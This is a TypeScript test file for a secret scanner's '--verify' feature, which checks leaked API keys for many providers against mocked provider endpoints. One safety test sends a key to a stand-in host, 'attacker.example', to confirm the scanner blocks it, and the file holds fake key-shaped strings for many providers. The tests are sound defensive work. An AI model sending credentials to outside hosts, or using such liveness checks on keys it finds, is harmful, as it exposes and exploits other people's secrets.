import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterAll, describe, expect, it } from 'vitest';

import { toUpload } from '../src/api';
import type { Detection } from '../src/rules/types';
import { toSarif } from '../src/sarif';
import { PROVIDERS, secretIn, verifySecrets, type SecretStatus } from '../src/verify';

/*
 * Every provider, mocked: no test talks to a real API. Keys are assembled at runtime so secret
 * scanners don't flag this file.
 */
const j = (...parts: string[]) => parts.join('');
const hex = (n: number) => '0123456789abcdef'.repeat(8).slice(0, n);
const mixed = (n: number) => 'aB3dE5fG7hJ9kL2mN4pQ6rS8tU1vW0xYz'.repeat(4).slice(0, n);

type Case = { provider: string; key: string; host: string; live: Mock; revoked: Mock; unknown?: Mock };
type Mock = { status: number; body?: unknown };

const CASES: Case[] = [
  { provider: 'paystack', key: j('sk_live_', hex(40)), host: 'api.paystack.co', live: { status: 200 }, revoked: { status: 401 }, unknown: { status: 500 } },
  { provider: 'stripe', key: j('sk_live_', '51', mixed(97)), host: 'api.stripe.com', live: { status: 200 }, revoked: { status: 401 }, unknown: { status: 429 } },
  { provider: 'stripe', key: j('rk_live_', mixed(40)), host: 'api.stripe.com', live: { status: 403 }, revoked: { status: 401 } },
  { provider: 'flutterwave', key: j('FLWSECK-', hex(32), '-X'), host: 'api.flutterwave.com', live: { status: 200 }, revoked: { status: 401 }, unknown: { status: 502 } },
  { provider: 'github', key: j('ghp_', mixed(36)), host: 'api.github.com', live: { status: 200 }, revoked: { status: 401 }, unknown: { status: 403, body: { message: 'API rate limit exceeded for 1.2.3.4' } } },
  { provider: 'github', key: j('ghs_', mixed(36)), host: 'api.github.com', live: { status: 403, body: { message: 'Resource not accessible by integration' } }, revoked: { status: 401 } },
  { provider: 'slack', key: j('xoxb-', '1234567890-', mixed(24)), host: 'slack.com', live: { status: 200, body: { ok: true } }, revoked: { status: 200, body: { ok: false, error: 'token_revoked' } }, unknown: { status: 200, body: { ok: false, error: 'ratelimited' } } },
  { provider: 'sendgrid', key: j('SG.', mixed(22), '.', mixed(43)), host: 'api.sendgrid.com', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'mailgun', key: j('key-', hex(32)), host: 'api.mailgun.net', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'resend', key: j('re_', mixed(8), '_', mixed(24)), host: 'api.resend.com', live: { status: 401, body: { name: 'restricted_api_key' } }, revoked: { status: 401, body: { name: 'validation_error' } } },
  { provider: 'telegram', key: j('123456789', ':AA', mixed(33)), host: 'api.telegram.org', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'anthropic', key: j('sk-ant-api03-', mixed(90)), host: 'api.anthropic.com', live: { status: 200 }, revoked: { status: 401 }, unknown: { status: 529 } },
  { provider: 'openai', key: j('sk-proj-', mixed(48)), host: 'api.openai.com', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'npm', key: j('npm_', mixed(36)), host: 'registry.npmjs.org', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'digitalocean', key: j('dop_v1_', hex(64)), host: 'api.digitalocean.com', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'render', key: j('rnd_', mixed(32)), host: 'api.render.com', live: { status: 200 }, revoked: { status: 401 } },
  { provider: 'discord-webhook', key: j('https://discord.com/api/webhooks/', '123456789012345678/', mixed(64)), host: 'discord.com', live: { status: 200 }, revoked: { status: 404 } },
];

const finding = (key: string, extra: Partial<Detection> = {}): Detection => ({ ruleId: 'SEC-GEN-001', severity: 'high', title: 'Key in code', file: 'src/config.ts', line: 3, snippet: `const KEY = '${key}';`, ...extra });

/** A fetch that answers every call with `answer`, and records what was asked. */
function mockFetch(answer: (url: URL) => Mock | Promise<Mock> | 'network-error') {
  const calls: { url: URL; init: RequestInit }[] = [];
  const fetchImpl = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = new URL(String(input));
    calls.push({ url, init: init ?? {} });
    const a = await answer(url);
    if (a === 'network-error') throw new TypeError('fetch failed');
    return new Response(a.body === undefined ? '{}' : JSON.stringify(a.body), { status: a.status });
  }) as typeof fetch;
  return { fetchImpl, calls };
}

const fast = { minGapMs: 0, timeoutMs: 1000 };

describe('fortis scan --verify, provider by provider', () => {
  it('has a test case for every provider it checks', () => {
    expect(new Set(CASES.map((c) => c.provider))).toEqual(new Set(PROVIDERS.map((p) => p.id)));
  });

  for (const c of CASES) {
    const outcomes: [SecretStatus, Mock | undefined][] = [['live', c.live], ['revoked', c.revoked], ['unknown', c.unknown]];
    for (const [expected, mock] of outcomes) {
      if (!mock) continue;
      it(`${c.provider} (${c.key.slice(0, 8)}…): HTTP ${mock.status}${mock.body ? ` ${JSON.stringify(mock.body)}` : ''} means ${expected}`, async () => {
        const { fetchImpl, calls } = mockFetch(() => mock);
        const d = finding(c.key);
        expect(secretIn(d)?.provider.id).toBe(c.provider);
        await verifySecrets([d], { fetchImpl, ...fast });
        expect(d.secretStatus).toBe(expected);
        expect(calls.length).toBeGreaterThan(0);
        // Only ever the provider's own host, over HTTPS, never following a redirect elsewhere.
        for (const call of calls) {
          expect(call.url.protocol).toBe('https:');
          expect(PROVIDERS.find((p) => p.id === c.provider)!.hosts).toContain(call.url.hostname);
          expect(call.init.redirect).toBe('error');
          expect(call.init.method ?? 'GET').toMatch(/^(GET|POST)$/);
        }
        expect(calls[0]!.url.hostname).toBe(c.host);
      });
    }
  }

  it('sends the key the way each provider expects', async () => {
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const byId = Object.fromEntries(CASES.map((c) => [c.provider, c.key]));
    await verifySecrets([finding(byId.paystack!), finding(byId.anthropic!), finding(byId.mailgun!), finding(byId.telegram!)], { fetchImpl, ...fast, concurrency: 1 });
    const headers = (host: string) => new Headers(calls.find((c) => c.url.hostname === host)!.init.headers);
    expect(headers('api.paystack.co').get('authorization')).toBe(`Bearer ${byId.paystack}`);
    expect(headers('api.anthropic.com').get('x-api-key')).toBe(byId.anthropic);
    expect(headers('api.anthropic.com').get('authorization')).toBeNull();
    expect(headers('api.mailgun.net').get('authorization')).toBe(`Basic ${Buffer.from(`api:${byId.mailgun}`).toString('base64')}`);
    expect(calls.find((c) => c.url.hostname === 'api.telegram.org')!.url.pathname).toBe(`/bot${byId.telegram}/getMe`);
  });
});

describe('fortis scan --verify, safety', () => {
  it("doesn't send a key whose provider isn't clear from its shape", async () => {
    // sk_live_ with a body that is neither Paystack's 40 hex nor Stripe's shape.
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const d = finding(j('sk_live_', 'abcdefghijklmnopqrstuv'));
    const r = await verifySecrets([d], { fetchImpl, ...fast });
    expect(calls).toEqual([]);
    expect(d.secretStatus).toBeUndefined();
    expect(r.notes.join(' ')).toMatch(/1 secret finding can't be checked.*treat it as live/);
  });

  it("leaves kinds of secret with no safe check alone (AWS keys, private keys, database passwords)", async () => {
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const list = [finding(j('AKIA', 'ABCDEFGHIJKLMNOP')), finding('-----BEGIN RSA PRIVATE KEY-----'), finding('postgres://app:Sup3rS3cret@db.example.com/app')];
    await verifySecrets(list, { fetchImpl, ...fast });
    expect(calls).toEqual([]);
    expect(list.every((d) => d.secretStatus === undefined)).toBe(true);
  });

  it('ignores findings that are not secrets', async () => {
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const dep = finding(j('ghp_', mixed(36)), { ruleId: 'DEP-OSV' });
    await verifySecrets([dep], { fetchImpl, ...fast });
    expect(calls).toEqual([]);
    expect(dep.secretStatus).toBeUndefined();
  });

  it('refuses a request to any host but the provider’s own', async () => {
    const paystack = PROVIDERS.find((p) => p.id === 'paystack')!;
    const original = paystack.requests;
    paystack.requests = (k) => [{ url: 'https://attacker.example/balance', headers: { authorization: `Bearer ${k}` } }];
    try {
      const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
      const d = finding(j('sk_live_', hex(40)));
      await verifySecrets([d], { fetchImpl, ...fast });
      expect(calls).toEqual([]);
      expect(d.secretStatus).toBe('unknown');
    } finally {
      paystack.requests = original;
    }
  });

  it('checks each distinct key once, however many places it is in', async () => {
    const key = j('ghp_', mixed(36));
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const list = [finding(key), finding(key, { file: 'b.ts' }), finding(key, { file: 'c.ts', commit: 'abc1234' })];
    await verifySecrets(list, { fetchImpl, ...fast });
    expect(calls).toHaveLength(1);
    expect(list.map((d) => d.secretStatus)).toEqual(['live', 'live', 'live']);
  });
});

describe('fortis scan --verify, limits', () => {
  it('times out a slow provider and calls the key unknown', async () => {
    const fetchImpl = ((_url: string | URL | Request, init?: RequestInit) =>
      new Promise((_resolve, reject) => init?.signal?.addEventListener('abort', () => reject(init.signal!.reason)))) as typeof fetch;
    const d = finding(j('npm_', mixed(36)));
    const started = Date.now();
    await verifySecrets([d], { fetchImpl, minGapMs: 0, timeoutMs: 50 });
    expect(d.secretStatus).toBe('unknown');
    expect(Date.now() - started).toBeLessThan(2000);
  });

  it('calls a key unknown when the network fails', async () => {
    const { fetchImpl } = mockFetch(() => 'network-error');
    const d = finding(j('ghp_', mixed(36)));
    await verifySecrets([d], { fetchImpl, ...fast });
    expect(d.secretStatus).toBe('unknown');
  });

  it('spaces out calls to the same provider', async () => {
    const times: number[] = [];
    const { fetchImpl } = mockFetch(() => {
      times.push(Date.now());
      return { status: 200 };
    });
    const keys = ['a', 'b', 'c'].map((s) => finding(j('ghp_', s.repeat(36))));
    await verifySecrets(keys, { fetchImpl, minGapMs: 60, timeoutMs: 1000 });
    expect(times).toHaveLength(3);
    const sorted = [...times].sort((a, b) => a - b);
    expect(sorted[2]! - sorted[0]!).toBeGreaterThanOrEqual(110);
  });

  it('checks at most maxChecks keys and marks the rest unknown', async () => {
    const { fetchImpl, calls } = mockFetch(() => ({ status: 200 }));
    const keys = 'abcde'.split('').map((s) => finding(j('ghp_', s.repeat(36))));
    const r = await verifySecrets(keys, { fetchImpl, ...fast, maxChecks: 2 });
    expect(calls).toHaveLength(2);
    expect(keys.map((d) => d.secretStatus)).toEqual(['live', 'live', 'unknown', 'unknown', 'unknown']);
    expect(r.notes.join(' ')).toMatch(/first 2 keys; 3 more are marked unknown/);
  });

  it('Mailgun: revoked only when both the US and EU hosts reject the key', async () => {
    const key = j('key-', hex(32));
    const eu = mockFetch((url) => (url.hostname === 'api.eu.mailgun.net' ? { status: 200 } : { status: 401 }));
    const d1 = finding(key);
    await verifySecrets([d1], { fetchImpl: eu.fetchImpl, ...fast });
    expect(d1.secretStatus).toBe('live');
    expect(eu.calls.map((c) => c.url.hostname)).toEqual(['api.mailgun.net', 'api.eu.mailgun.net']);

    const half = mockFetch((url) => (url.hostname === 'api.eu.mailgun.net' ? 'network-error' : { status: 401 }));
    const d2 = finding(key);
    await verifySecrets([d2], { fetchImpl: half.fetchImpl, ...fast });
    expect(d2.secretStatus).toBe('unknown');
  });

  it('sums up what it found, live ones first', async () => {
    const { fetchImpl } = mockFetch((url) => (url.hostname === 'api.github.com' ? { status: 200 } : { status: 401 }));
    const r = await verifySecrets([finding(j('ghp_', mixed(36))), finding(j('npm_', mixed(36)))], { fetchImpl, ...fast });
    expect(r).toMatchObject({ checked: 2, live: 1, revoked: 1, unknown: 0 });
    expect(r.notes[0]).toBe('Checked 2 leaked keys with their providers: 1 live, 1 revoked. Rotate the live ones first.');
  });
});

describe('the label in the outputs', () => {
  it('goes up with the finding, and into SARIF, but the key does not', () => {
    const key = j('ghp_', mixed(36));
    const d = finding(key, { secretStatus: 'live' });
    const up = toUpload(d);
    expect(up.secretStatus).toBe('live');
    expect(JSON.stringify(up)).not.toContain(key);
    const sarif = toSarif([d]) as { runs: { results: { properties?: Record<string, unknown> }[] }[] };
    expect(sarif.runs[0]!.results[0]!.properties).toMatchObject({ secretStatus: 'live' });
    expect(toUpload(finding(key)).secretStatus).toBeUndefined();
  });
});

describe('fortis scan --verify, end to end', () => {
  const dirs: string[] = [];
  afterAll(() => dirs.forEach((d) => rmSync(d, { recursive: true, force: true })));

  // A Paystack key that was rotated and a GitHub token that still works, behind a fetch that
  // answers like the providers and refuses every other host.
  const paystack = j('sk_live_', hex(40));
  const github = j('ghp_', mixed(36));
  const MOCK = `
const hosts = [];
globalThis.fetch = async (input) => {
  const url = new URL(String(input));
  hosts.push(url.hostname);
  process.on('exit', () => require('node:fs').writeFileSync(process.env.FORTIS_TEST_HOSTS, hosts.join(String.fromCharCode(10))));
  if (url.hostname === 'api.github.com') return new Response('{"login":"someone"}', { status: 200 });
  if (url.hostname === 'api.paystack.co') return new Response('{"status":false}', { status: 401 });
  throw new TypeError('blocked in test: ' + url.hostname);
};`;

  const project = () => {
    const dir = mkdtempSync(join(tmpdir(), 'fortis-verify-'));
    dirs.push(dir);
    const g = (...a: string[]) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
    g('init', '-q');
    writeFileSync(join(dir, 'config.js'), `const PAYSTACK = "${paystack}";\nconst GH = "${github}";\n`);
    writeFileSync(join(dir, 'mock-fetch.cjs'), MOCK);
    g('add', 'config.js');
    return dir;
  };
  const run = (dir: string, ...args: string[]) => {
    const cli = join(__dirname, '..', 'src', 'index.ts');
    const tsx = join(__dirname, '..', 'node_modules', 'tsx', 'dist', 'cli.mjs');
    const env = { ...process.env, FORTIS_KEY: '', HOME: dir, USERPROFILE: dir, XDG_CONFIG_HOME: dir, APPDATA: dir, NO_COLOR: '1', FORTIS_NO_UPDATE_CHECK: '1', HTTPS_PROXY: '', HTTP_PROXY: '', https_proxy: '', http_proxy: '', FORTIS_TEST_HOSTS: join(dir, 'hosts.txt'), NODE_OPTIONS: `--require ${JSON.stringify(join(dir, 'mock-fetch.cjs'))}` };
    const r = spawnSync(process.execPath, [tsx, cli, 'scan', '--no-upload', '--json', ...args], { cwd: dir, encoding: 'utf8', env });
    return JSON.parse(r.stdout) as { detections: Detection[]; notes: string[] };
  };

  it('labels each key from its own provider, and asks no one else', () => {
    const dir = project();
    const out = run(dir, '--verify');
    const status = Object.fromEntries(out.detections.map((d) => [d.line, d.secretStatus]));
    expect(status).toEqual({ 1: 'revoked', 2: 'live' });
    expect(out.notes.join(' ')).toMatch(/Checked 2 leaked keys with their providers: 1 live, 1 revoked\. Rotate the live ones first\./);
    expect(readFileSync(join(dir, 'hosts.txt'), 'utf8').split('\n').sort()).toEqual(['api.github.com', 'api.paystack.co']);
    // The JSON output is masked like every other output.
    expect(JSON.stringify(out)).not.toContain(paystack);
  }, 60_000);

  it('checks nothing without --verify, or with --offline', () => {
    const dir = project();
    expect(run(dir).detections.every((d) => d.secretStatus === undefined)).toBe(true);
    const offline = run(dir, '--verify', '--offline');
    expect(offline.detections.every((d) => d.secretStatus === undefined)).toBe(true);
    expect(offline.notes.join(' ')).toMatch(/--verify needs the network/);
    expect(existsSync(join(dir, 'hosts.txt')) ? readFileSync(join(dir, 'hosts.txt'), 'utf8') : '').toBe('');
  }, 60_000);
});
